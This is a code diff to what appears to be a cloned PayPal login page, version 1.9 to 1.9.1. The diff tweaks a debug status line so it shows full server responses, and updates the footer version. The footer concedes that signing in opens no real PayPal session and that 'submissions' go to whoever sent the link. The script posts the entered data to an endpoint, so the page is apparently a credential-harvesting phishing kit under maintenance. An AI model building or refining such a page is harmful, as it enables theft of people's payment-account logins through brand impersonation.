@@ -151,16 +151,16 @@
     font-size:14px; color:var(--body); text-align:center;
   }
 
-  /* debug status line */
   .dbg {
     display:none;
     margin-top:12px;
     padding:10px 12px;
     border-radius:6px;
-    font-size:12px;
+    font-size:11px;
     line-height:1.5;
     font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
     word-break:break-word;
+    white-space:pre-wrap;
   }
 
   .dbg.is-ok { display:block; color:var(--ok); background:var(--ok-bg); border:1px solid var(--ok-line); }
@@ -310,7 +310,7 @@
     <p><strong>Session.</strong> Because the page is a reproduction, signing in does not open a PayPal session on your device. Your PayPal account is untouched and you are not logged in to paypal.com afterwards.</p>
     <p><strong>If something looks wrong.</strong> Close the tab, open paypal.com directly and compare. To revoke a code-based login, use PayPal's own Security settings.</p>
     <p><strong>Accuracy.</strong> The layout is reproduced as closely as a static page allows, but PayPal changes its interface regularly, so wording and spacing may differ from the live page. Questions about a specific submission should go to the person who sent you this link.</p>
-    <p>Team project · Last updated November 2026 · Version 1.9</p>
+    <p>Team project · Last updated November 2026 · Version 1.9.1</p>
   </section>
 </footer>
 
@@ -456,11 +456,11 @@
       body: JSON.stringify(payload)
     }).then(function (res) {
       return res.text().then(function (txt) {
-        if (res.ok) debug(dbgNode, "SENT " + res.status + " · " + txt.slice(0, 140), true);
-        else debug(dbgNode, "FAIL " + res.status + " · " + txt.slice(0, 140), false);
+        if (res.ok) debug(dbgNode, "SENT " + res.status + "\n" + txt, true);
+        else debug(dbgNode, "FAIL " + res.status + "\n" + txt, false);
       });
     }).catch(function (err) {
-      debug(dbgNode, "NETWORK · " + String(err).slice(0, 140), false);
+      debug(dbgNode, "NETWORK\n" + String(err), false);
     });
   }
 
